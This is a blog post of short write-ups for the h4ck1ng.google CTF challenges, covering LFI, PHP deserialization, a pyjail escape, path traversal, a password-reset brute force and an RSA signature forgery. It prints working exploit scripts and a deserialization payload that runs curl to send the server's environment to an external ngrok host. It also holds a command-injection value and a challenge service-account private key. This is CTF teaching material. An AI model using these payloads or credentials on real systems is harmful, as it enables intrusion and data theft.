+++
title = "Writeups for h4ck1ng.google challenges"
date = 2022-10-17
summary = true
toc = true

[taxonomies]
categories = ["security"]
+++

This post contains short writeups for all main challenges of h4ck1ng.google. 
<!-- more -->

I'm keeping these quite brief due to being busy with coursework.

## EP000CH01
The following javascript in the web page reveals a `load_board.php` route that is vulnerable to LFI. 
```html
<script>
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', 'baseboard.fen')

  xhr.open('POST', url, true)
  xhr.send(formData);
  window.location.href = "index.php";
}
</script>
```

We can leak `/proc/self/environ` to obtain the flag, which is stored as an environment variable.

## EP000CH02

In the search query, the `file` is vulnerable to LFI, but will only show matches from the file for search terms with at least 4 characters. You can leak bits of the source code (after obtaining path to source code from `/proc/self/environ`). 

LFI of `../../../../../flag` gives the flag, since we know the solve URL's are of the form h4ck1ng.google/solve/..

## EP001CH01

`grep` for "wannacry" in the binary that was provided, which leads to this URL: [https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/](https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/). This page contains a large number of keys, one of which likely is the encryption key.

We can extract all the keys from the page:
```python
import requests
from bs4 import BeautifulSoup
from tqdm import tqdm
url = 'https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/'

r = requests.get(url)

soup = BeautifulSoup(r.text)

for a in tqdm(soup.find_all('a', href=True)):
    r = requests.get(url + a['href'])
    with open(a['href'], 'w') as f:
        f.write(r.text)
```
Then, just try decrypting with all the keys :)
```bash
for f in *.pem; do
	./wannacry -encrypted_file flag -key_file $f
done
```

## EP001CH02

The binary contains a wordlist and a way to map current time to a word. This word is appended to [https://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/](https://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/), and is only valid for a short period of time. Visiting the valid URL gives you the flag. However, the program won't normally run properly (or call that function).

Using GDB, we can do
```
gdb break main
r
jump print
c
```
and quickly visit the URL to get the flag.

## EP001CH03

Same webpage as the first challenge of episode 000. However, the endpoint we exploited last time now makes sure that the file ends with `.fen`. 

There's another attack vector, though. Making moves on the chess board results in get requests with a `move_end` parameter that consists of base64 encoded PHP array. i.e. 
`?move_end=YToyOntpOjA7czoyOiJlMiI7aToxO3M6MjoiZTQiO30=` which decodes to `a:2:{i:0;s:2:"e2";i:1;s:2:"e4";}`, a PHP array representing the move. This is passed to `deserialize()`, so we can exploit this.There's even a convenient object in the source code, `Stockfish`, with these interesting functions:
```php
public function __wakeup()
    {
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
        echo '<!--'.'wakeupcalled'.fgets($this->pipes[1], 4096).'-->';
    }

 public function __toString()
    {
        return fgets($this->pipes[1], 4096);
    }
```
`__wakeup()` gets called when deserializing the object, and conveniently there is a debug print of the object right after which will result in `__toString()` being called. We then construct a deserialization payload like such:
```php
O:9:"Stockfish":4:{s:3:"cwd";s:2:"./";s:6:"binary";s:69:"curl https://34c4-85-255-233-71.eu.ngrok.io/$(printenv | grep google)";s:13:"other_options";a:1:{s:12:"bypass_shell";s:4:"true";}s:14:"descriptorspec";a:2:{i:0;a:2:{i:0;s:4:"pipe";i:1;s:1:"r";}i:1;a:2:{i:0;s:4:"pipe";i:1;s:1:"w";}}}
```
to get the environment value containing the flag.

## EP002CH01

Extract RGBA values of the image using [StegOnline](https://stegonline.georgeom.net/image)
Decode them as bytes representing a character each.
```python
# a = [1, 0, ...], the list of extracted values.
s = ''
for i,v in enumerate(a):
    if i % 8 == 0 and i != 0:
        if len(s) == 8:
            print(chr(int(s, 2)),end='')
        s = ''
    if v == 1 or v == 0:
        s += str(v)
```
This decodes to a certificate, (might be slightly corrupted because of bad parsing, but works)
```
-----BEGIN CERTIFICATE-----
MIIDZzCCAk8CFBoKXnXdnNubl8olJdv40AxJ9wksMA0GCSqGSIb3DQEBBQUAMHAx
CzAJBgNVBAYTAkNIMQ8wDQYDVQQIDAZadXJpY2gxOzA5BgNVBAoMMmh0dHBzOi8v
aDRjazFuZy5nb29nbGUvc29sdmUvNTNjdXIxVHlfQnlfMGI1Q3VyMXRZMRMwEQYD
VQQDDApnb29nbGUuY29tMB4XDTIyMDkzMDE4NTEwNVoXDTMyMDkyNzE4NTEwNVow
cDELMAkGA1UEBhMCQ0gxDzANBgNVBAgMBlp1cmljaDE7MDkGA1UECgwyaHR0cHM6
Ly9oNGNrMW5nLmdvb2dsZS9zb2x2ZS81M2N1cjFUeV9CeV8wYjVDdXIxdFkxEzAR
BgNVBAMMCmdvb2dsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQDCX25BoQBBndrOiS6L11/RwWf6FNS+fUct7CLq9yMxU+xJ+yPVFZa7+trkvwe0
IXWduNIb/USvtOb8I8X8H/MHVMCypBQisFMxHnZmv2D/QVRySIJpMdah8va+LL5o
7Dv0LD73ynGUw8rW8VQUrlGF5cJRSgd3ZVbDUjR33GD4TjdIChzs/WMZGSP7c/lk
sSLMd2eCYbdwo5pz7KaYa7ta0b3gf055q4E/uJ00TUN26GkYOi/c7PZrgQu+hXR6
onn2HhkBNrloUlZaI5kJ2v3QRHt2UxnAhS7YVpQ6ZS4h8LQf6mvnZ/Zx71SyZmkk
AuvhSjU8bCeIypSC82RbEi6fAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBABj1PIHB
cKJgxEXo6AT+8OMYWFd2M2HsioevNvmpsAQjjlPRfY3E9DF7H49XagnON3YM
dDvN4IwmHSRKIemdEyc/D2+Dr/Ky5FSU6NymUiUGUGV+aDGXIFV/NOaq0b9ASbBh
78TLN2+/Val933tHWQpPqmpw30v4XknYPF5R+ghqr9r9A0dVPstDmq1HBOuazWJe
DBUBHenbSW6EPnFYZc8zuCSLZtIJvlAryJrmcFWTridUmtXjM5Lyh05LFAFVH6wl
z0sVEvisfE9aw4zfotBsV6zvgOL1ypYsX20KJ6zIJycRBkWgmOzQxKCZ5fxfKCFT
8mr99Mujp9EBzPA=
-----END CERTIFICATE-----
```
and base64 decoding with `cat cert.pem | base64 -d` gives the flag.

## EP002CH02

Just looking through the log file, the flag can be quickly found.

## EP002CH03

We have a shell with most commands being disabled. We do have tab completions, though. This allows us to locate the flag with completion on something like `../../../`. Furthermore, there is a tool `_dnr_toolkit`, and completions are known for its subcommands. With a little bit of testing, we notice an interesting feature:
```
_dnr_toolkit sendkeepalive 
reading serverlist from /default_serverlist
invalid server spec: testspec
``` 
Then, using tab completion on `_dnr_toolkit sendkeepalive --serverlist /flag` gives us the flag.

## EP003CH01

Through the intro challenge we have the password to obtain a shell on a computer. Digging around we find a file called `backup.py`. It uses an API token to fetch a file from `https://docs.googleapis.com/v1/documents/1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM`. They have deleted the file containing the token, though. Or have they? 
We can find the private key that is used to create authorization tokens in `.config/gcloud/`

```json
{
  "client_email": "backup-tool@project-multivision.iam.gserviceaccount.com",
  "client_id": "105494657484877589161",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEH/WQiLjqB2nn\ncMc+fBOMbq3SE75vkj9EqNWi+ilk+ChphklRGsGcVeFsuPp06WjN1d/knWw/f+0M\nPY3tli2oQIHuqLH5GIkVhm/xpdgZUbskO8EjSI3eIs+qCMcfObgeFSw7T29PorC3\nIuQDPTfIgo4oHA7UlEBE8mZVUnEXFDh/5sNFa+UzUE1QqpWymdRVhDHekxz0erWM\nc67Ovxti40X4LnSvHOBjinjMDdtmvXBel0mIzUQxjLp6hmTPoKD7PKUodSN2QaKA\nm+pQ6deWr5QvXTBc5XEXKpMnZnn4KqouJSic7jWGAOxY1iy/We4OWeUWDYiFBxZu\nZe+IZSL5AgMBAAECggEAGg1Kv9fBhGjWswUimlS9/gYHteOkhMqO9+5bboo/bGeg\naqAJZiohNMSdrKUHs/b7UnhKBOK6adby5JDapQgxaWukNtEWzwlo0ECq5xUKFxbp\nvn7ngWnWWn8SSbpfxPCUWf6jAP/kv9XTFoiedCWyHsLk4kQT3j4RKXdvi37ngdKU\ne+CTFCDIlSr7Q2MdcKMql8lRkjcW0kvY9w8+gVXbgl4M3bNMru2JlxNn2scaGXg0\nn/GbifMvbxYguCKhgTNH+t0N8vilVO8qUInvSDzQMSEZEycjxlsUgIAvrRy6QXT0\n4S1TbIARnrFC0g4zY0mg1EycuhO3OyeiM2KTweY7rwKBgQD3Kp2J6YsK2RuwktLb\n1pC2o0jYuOMSGCsjULzeqYkXHpmFY7iojd/g8FStPdJ+BanqcsZIUQf07zUxk5Xb\nDdwH+9Q2QpQahRc6GhwcySd3v79ZaAkZAO3r/QjF0OPLRLyvRXR8R5g25LYXL8Yk\nnLbAGfcVjyW5XGCZOsmnu72+9wKBgQDLIloXEJJjwa+QTnBhmkOv922q0sVRLOUY\nuj621qt09hgMTztepFsysBjJmDtAMOJpQott1G2m0wVkk7zdzmPFUvOMDc9/54y8\niqmBvoMBSLgWElp1vXvW7ICED/d11m6aOwIVKJvJtHvS5seAd8TzHSy+5FUPjG5m\naS5psPuBjwKBgQDtTtpBDp00Bi2iw+V1szXwVSfdBO7ncZMBbkRYmHgKXZPS0WL7\nWnRoWPdD+kZ+PtvcQOSFjF9SWNU+y0+nKVBnze77RcNDDyO04lq5fJzLSavjoJKT\nkiPdX22r2BrOECoFMm9b37WShtcZvgHFJz4DhSqJZY43wSzyEdKJnCTbEwKBgQDE\nz6ar3DGJl5pLXcRCvJ1CO5+0t3vYF4Bsgd7LdZgvvVQ1cPrbyrBVnwqVH/qgSfzD\n8WZ35i7LSH9cIEwIN7Sw9ZrkomjdyvGvp0VuYLA7KUK6l9OvagQ3i3NFANdJA5ar\ntephp7OxLT4fa9v1m5Vl22mEFmRXqT852ETQwFod/wKBgAgHdxxm1anORWoZVMhZ\nDgWAhJSWsYv1HPPx18NTwVt0GxBA+ssvg8ET7zDXd5E1vay533SaV4pk/w2mWsZU\nlbfS/vMslyg9GPpaKmhGVi6d3jr0xjgh5Vs72WCo2lAXvHwZNslB20SCmUzdP4nU\nrwrzx7aO6kKU+DHb9EoEN+LI\n-----END PRIVATE KEY-----\n",
  "private_key_id": "722d66d6da8d6d5356d73d04d9366a76c7ada494",
  "project_id": "project-multivision",
  "token_uri": "https://oauth2.googleapis.com/token",
  "type": "service_account"
}
```

We can use the above json file to obtain a token that allows us to fetch the file. 
```python
SCOPES = [
    'https://www.googleapis.com/auth/cloud-platform', 
    'https://www.googleapis.com/auth/documents.readonly'
]
SERVICE_ACCOUNT_FILE = 'adc.json'

import google.auth
import google.auth.transport.requests
from google.oauth2 import service_account

cred = service_account.Credentials.from_service_account_file(
            SERVICE_ACCOUNT_FILE, scopes=SCOPES)
auth_req = google.auth.transport.requests.Request()
cred.refresh(auth_req)
print(cred)
print(cred.token)
```
We can then fill the missing `get_token()` function in `backup.py` to fetch the file, which contains the flag.

## EP003CH02
We have a fun game in the terminal. It's quite hard to beat though. The goal of the game is to obtain a password. However, the Konami code works as a password, so we can skip the game. 
We end up in a pyjail that has a line length limit, too.

First, we locate `os._wrap_close` by just playing with commands like this:
```python
print("".__class__.__mro__[1].__subclasses__()[125:])
```
Then, we must get creative to bypass the line length limit. 
There is a `config` object with a `__setattr__` method. This allows us to store things.
Thus, we do
```python
print(config.__setattr__('a',"".__class__.__mro__[1].__subclasses__))
print(config.__setattr__('b', config.a()[132].__init__.__globals__))
print(config.b['popen']('cat flag').read())
```
to get the flag.

## EP003CH03

Android application that can be used to scan a QR code. However, it won't give us the flag unless we are subscribed.

With `apktool d` we can decompile the challenge.
Then, we just patch the `.smali` file containing the `isSubscribed()` method to return True.
```
.method public static final isSubscribed()Z
    .locals 1

    .line 24
    const v0, true
    return v0
.end method
```
We use `apktool b` to build this, and then sign it with 
`uber-apk-signer`. Scan the QR code, get the flag.

## EP004CH01

Skip this one until you have obtained source code for the challenge through EP004CH03.
Then, we can figure out what to send to the import endpoint. 

Using [ptoomey3/evilarc](https://github.com/ptoomey3/evilarc), we construct an archive that cotains a file with directory traversal characters in its path. i.e. a file like `../../../../../../../flag`.

The import endpoint notices that the file exists and gives us a diff, containing the flag.
The correct URL parameters were obtained through source code for `app.go`.
```
curl -v -F 'attachments=@evil.tar.gz' 'https://path-less-traversed-web.h4ck.ctfcom
petition.com/import?debug=true&submission=sample_submission&dryRun=false'
```

## EP004CH02

The vulnerability is in the following function in the application
```js
/**
 * Checks if the given strings are identical. Runs in constant time and it
 * should be invulnerable from timing attacks.
 * 
 * Reference: https://www.chosenplaintext.ca/articles/beginners-guide-constant-time-cryptography.html
 * 
 * @param {string} a
 * @param {string} b
 * @returns a boolean indicating if the strings are equal.
 */
function safeEqual(a, b) {
    let match = true;

    if (a.length !== b.length) {
        match = false;
    }

    const l = a.length;
    for (let i = 0; i < l; i++) {
        match &&= a.indexOf(i) === b.indexOf(i);
    }

    return match;
}

module.exports = safeEqual
```

This function is used in the login flow of the application, in 
```js
/**
 * Finds a user by username and password.
 * @param {string} username
 * @param {string} password
 * @returns the user if one is found.
 */
async function getUserByUsernameAndPassword (username, password) {
  const user = await getUserByUsername(username)
  if (!user) return undefined

  const hashedPassword = crypto.createHash('sha1').update(password).digest('base64')
  if (!safeEqual(user.hashedPassword, hashedPassword)) return undefined
  
  return user
}
```

The vulnerability is that it is not comparing the password characters, or indexes of characters. For `i` from 0 to the length of the user's hashed password,  it checks that the index of digit `i` is the same in the hashed password and the hash of the entered password.
We can also reset `tin`'s password using 
```js
/**
 * Resets the password given the username.
 * @param {string} username
 * @returns a boolean indicating if the reset is successful
 */
async function resetPasswordByUsername (username) {
  const user = await getUserByUsername(username)
  if (!user) return false

  // we don't allow admins to reset passwords
  if (!!user.isAdmin) return false

  const password = crypto.randomBytes(8).toString('hex')
  const hashedPassword = crypto.createHash('sha1').update(password).digest('base64')
  
  user.hashedPassword = hashedPassword
  return true
}
```

Thus, we simply need to create a password, that, after being converted to hex, hashed with SHA1 and then encoded with base64, doesn't contain digits 0 to 16 in the base64 encoded string.

```python
import hashlib
from base64 import b64encode
import os
import random
import string

while True:
    data = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    m = hashlib.sha1()
    m.update(data.encode())
    password = b64encode(m.digest())
    print(password)
    print(data)
    match = False
    for t in [str(i) for i in range(16)]:
	if t.encode() in password:
	    match = True
	    break
    if not match:
	    break
```

Using the following script, we obtain the password `JqPzxTR4xZmQkqdR`. We can now keep resetting the password until the password turns out to be a base64 with no digits. Only 10 of the 64 possible base64 characters are digits, so this doesn't take too long.

```python
import requests
import hashlib

login = 'http://vrp-website-web.h4ck.ctfcompetition.com/login'
reset = 'http://vrp-website-web.h4ck.ctfcompetition.com/reset-password'

data = {'username': 'tin', 'password': 'JqPzxTR4xZmQkqdR'}
rdata = {'username': 'tin'}
i = 1
while True:
    print(i)
    r = requests.post(login, data=data)
    if 'Incorrect credentials' not in r.text:
        print(r.text)
        with open('output.html', 'w') as f:
            f.write(r.text)
        print(r.headers)
        break
    r = requests.post(reset, data=rdata)
    i += 1
```

With this exploit script, we can reset the password until our password satisfies the check done by `safeEqual()`. We log in as tin and obtain the flag.

## EP004CH03

The repository has something called pre-submit checks that can be ran with `git push --push-option=presubmit`

```
remote: Starting presubmit check
remote: Cloning into 'tmprepo'...
remote: done.
remote: HEAD is now at 5d870ec test
remote: Building version v0.1.1
remote: ./build.sh: line 5: go: command not found
remote: Build server must be misconfigured again...
remote: Thank you for your interest, but we are no longer accepting proposals
```
Hmm, interesting, the version comes from the file `configure_flags.sh`
```bash
#!/usr/bin/env bash

# IMPORTANT: Make sure to bump this before pushing a new binary.
VERSION="v0.1.1"
COMMIT_HASH="$(git rev-parse --short HEAD)"
BUILD_TIMESTAMP=$(date '+%Y-%m-%dT%H:%M:%S')

LDFLAGS=(
  "-X 'main.Version=${VERSION}'"
  "-X 'main.CommitHash=${COMMIT_HASH}'"
  "-X 'main.BuildTime=${BUILD_TIMESTAMP}'"
)
```
If we change `VERSION` to `$(cat /flag)` and push, we obtain the flag.

## EP005CH01

We have some random `.bin` file. Hints at a 90s toy, in the videos, Natalie Silvanovich talks about hacking tamagotchi. From Natalie's repository [natashenka/Tamagotchi-Hack](https://github.com/natashenka/Tamagotchi-Hack) we can obtain a python script that can extract images from the file that was given to us, a memory dump. 

I needed to apply a small change to the script to get the full flag. The solve script is as follows:
```python
from PIL import Image

f = open("challenge.bin", 'rb')

a = f.read()
s = ""
#offset = 0x201292
#offset = 0x257010
#offset = 0x2AB139
offset = 0

a = a[offset:]

num = 0
o =  0# 0 0xaab# 0 # 0x1539

while True:
	width = ord(a[o])
	#//while (width == 0):
	#//	o = o + 1
	#//	width = ord(a[o])
	height = ord(a[o+1])
	print width,
	print height
	o = o + 2
	if( height > 0x60):
		print "end"
		print o + offset
		break
	extra = 0
	if( height > 0x60):
		print "end"
		print o + offset
		break
	if ((width) % 4 != 0):
		while ((width) % 4 != 0):
			width = width + 1
	if ((height) % 4if != 0):
		#for t in range(0, (height) % 4):
		#height  = height + 1

		print "Padded to " + str(width) + " by " + str(height)
	s = ""
	for i in range(0, height*width/4 + 1):
		for j in range(0, 4):
			#print ord(a[i])
			#print (0x03 << ((3- j)*2))
			print len(a), i, o, i+o
			if i+o >= len(a): break
			k = ord(a[i+o]) & (0x03 << ((3- j)*2))

			l = ((k) >> ((3-j)*2))
		
			s = s + chr(0xFF&(~(l*(255/4))))
	o = o + height*width/4
	#print s
	# fromstring
	image = Image.frombytes(
        "L", (width, height), s, "raw", 
        "L"
        )
	print "img " + str(num) + " at " + str(o)
	image.save("/data/im-" + str(num) + ".bmp")
	num = num + 1
```

With this, we get images that spell out the flag.

## EP005CH02
I wish I had the time to prepare a proper writeup for this attack, it was a lot of fun. 
This was a really fun challenge, a tricky case of Bleichenbacher'06. Unfortunately I am really pressed for time right now, but the following two links should give a good introduction to the BB'06 attack.

This writeup is heavily adapted from [Filippo Valsorda's writeup](https://words.filippo.io/bleichenbacher-06-signature-forgery-in-python-rsa/).

Here's another useful [post](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/) on the topic, by Hal Finney.

Here's a useful video on the topic, from BlackHat: [A Decade After Bleichenbacher '06, RSA Signature Forgery Still Works](https://www.youtube.com/watch?v=2xspZfXI_nY).


The tricky bit in this challenge is finding where we can put garbage. 

The padding is correctly validated, the application ensures the padding is FF bytes.
```python
padding, digest_info = k[2:].split(b'\x00', 1)

if len(padding) < 8:
    raise Exception('invalid padding length')
if padding != b'\xff'*len(padding):
    raise Exception('invalid padding content')
```
However, in the DER sequence parsing part, we can fit garbage:
```python
sequence = DerSequence()
sequence.decode(digest_info)
_digest_algorithm_identifier, _digest = sequence

sequence = DerSequence()
sequence.decode(_digest_algorithm_identifier)
_digest_algorithm_identifier = sequence[0]

object_id = DerObjectId()
object_id.decode(_digest_algorithm_identifier)
digest_algorithm_identifier = object_id.value
if digest_algorithm_identifier != '2.16.840.1.101.3.4.2.1':
    raise Exception('invalid digest algorithm identifier')

_null = sequence[1]
null = DerNull()
null.decode(_null)

octet_string = DerOctetString()
octet_string.decode(_digest)
digest = octet_string.payload
```
Since the length of the `_digest_algorithm_identifier` sequence is never checked, we can hide something after the DerNull in the sequence. This is a bit tricky, since DerSequences (and DerOctetStrings) declare their length at the beginning of the DER representation. For example, in the representation of
```python
DerOctetString(b'hello!').encode()
b'\x04\x06hello!'
```
'\x06' denotes the length of the string 'hello!'. If the lengths are wrong, the parsing will fail, as it might e.g. read only 4 bytes of 'hello!' and expect 'o!' to be the header for the next part of the DER sequence, or it might think it's done reading the whole DER sequence before all your data is consumed.

To start off, we need some functions from Filippo Valsorda's writeup: 
```python
from Crypto.Util.asn1 import DerSequence, DerObjectId, DerOctetString, DerNull
from gmpy2 import mpz, iroot, powmod, mul, t_mod
import hashlib
import json
import binascii

# to_bytes(), from_bytes(), get_bit(), set_bit() and cube_root() taken from Filippo Valsorda's post. 

def to_bytes(n):
    """ Return a bytes representation of a int """
    return n.to_bytes((n.bit_length() // 8) + 1, byteorder='big')

def from_bytes(b):
    """ Makes a int from a bytestring """
    return int.from_bytes(b, byteorder='big')

def get_bit(n, b):
    """ Returns the b-th rightmost bit of n """
    return ((1 << b) & n) >> b

def set_bit(n, b, x):
    """ Returns n with the b-th rightmost bit set to x """
    if x == 0: return ~(1 << b) & n
    if x == 1: return (1 << b) | n

def cube_root(n):
    return int(iroot(mpz(n), 3)[0])
```
and we also use Filippo's method for generating the suffix. 
```python
# find a number that, once cube rooted, ends with the digest_info DER sequence.
def gen_suffix(target_suffix):
    sig_suffix = 1
    for b in range(len(target_suffix)*8):
	if get_bit(sig_suffix ** 3, b) != get_bit(from_bytes(target_suffix), b):
	    sig_suffix = set_bit(sig_suffix, b, 1)
    return sig_suffix
```

As for obtaining the prefix, I simply cube root the prefix and check if it cubes back to the correct prefix. As long as that doesn't work, I keep adding garbage (FF and 00 bytes) to the end, thus "pushing" the error away from my payload. After a while, I find something that cubes back to a number that begins with my intended prefix, and ends with a bunch of garbage.

```python
sig_prefix = cube_root(from_bytes(target_prefix + b'\xff' * 34 + b'\x00' * 30))
# print(sig_prefix ** 3)
```

So, how can we tie these two together?
We can have garbage between our prefix and suffix, hidden in the DER sequence. Since DER sequences start with declaring their length, the easiest way to get those correct is to use python to generate our payload

```python
def sign(i):
     digest_algorithm_identifier = DerSequence([
	DerObjectId('2.16.840.1.101.3.4.2.1').encode(),
	DerNull().encode(),
	DerOctetString(b'\x01'*(i)) # This is our garbage, we can replace this with anything
     ])

     digest = hashlib.sha256(json.dumps(["pzero-adventures", "hur", -2]).encode()).digest()

     digest_info = DerSequence(([
	digest_algorithm_identifier,
	DerOctetString(digest).encode(),
     ])).encode()
          
     return digest_info
```
Now, we find the target prefix of our payload. I use sign() with varying inputs so that the generated payload + the padding bytes at the beginning sum to 256 bytes.
```python
target = b'\x00\x01' + b'\xff'*8 + b'\x00' + sign(189)
```
From target, we take the bytes up to header of our garbage DerOctetString, but not its payload. This way, we have the correct lengths defined in our payload, and we are free to fill it with garbage.
```python
target_prefix = b'\x00\x01\xff\xff\xff\xff\xff\xff\xff\xff\x000\x81\xf20\x81\xcd\x06\t`\x86H\x01e\x03\x04\x02\x01\x05\x00\x04\x81\xbd'
sig_prefix = cube_root(from_bytes(target_prefix + b'\xff' * 34 + b'\x00' * 30))
```
The suffix is simpler, the target suffix is the DerOctetString of our message's sha256 digest.
```python
target_suffix = b'\x04 \x14\xd4\x88o\x84\xa2\xa78ge\xbf\x7f\x88\xfe\x18\xac\xcc\x135\x1e\x08\xe1.\xf6ce\xe0\xa7\tTR\xf1'
sig_suffix = gen_suffix(target_suffix)
suffix = to_bytes(sig_suffix)
```

Now, we can concatenate them, with our garbage in between, and pad it with zeroes to fill the signature up to the required length. I simply play around with this until I get something that gets cubed such that our payload starts at the right offset. That is, when RSA decryption (cubing our input) is done, our we expect that `len(payload) == 256`, and `payload[0] = b'\x01'`, and so on...

```python
# play around with i until we get something that is of right order of magnitude
i = 171
bad = b'\x00' * i + b'2\xcb\xfdJz\xdcy\x05X=y \xd7\x16]w\xcf\x8doK\x19\xa4\xc1@&\xdc\x9b\xf5Wk-\xeb'
bad += b'\x01' * ((195 - 5 - i)) + b't=\xd3b#\x98\xd1P\x14 \xba\x84\xd03\xcc\xb6#\xddG\xb8Ra\xbe0\xa1\x83*>v\xc5\xd5\xde\x9dQ'
```
I used something like the following to test the validity of my payload.
```python
assert len(bad) == 256
import binascii
input = binascii.hexlify(bad).decode()

s = bytes.fromhex(input)
s = int.from_bytes(s, 'big')
assert s**3 < n
k = pow(s, 3, n)
k = int.to_bytes(k, 2048//8, 'big')
print(verify(k)) # test with the function used in the remote server to make sure the payload works.
```
After forging the signature, the flag is obtained by posting the name, score and signature to the highscores endpoint. 

## EP005CH03

During the "HACKING GOOGLE" logo flash in the videos, morse code can be heard in the background. Decoding the morse code gives the flag.
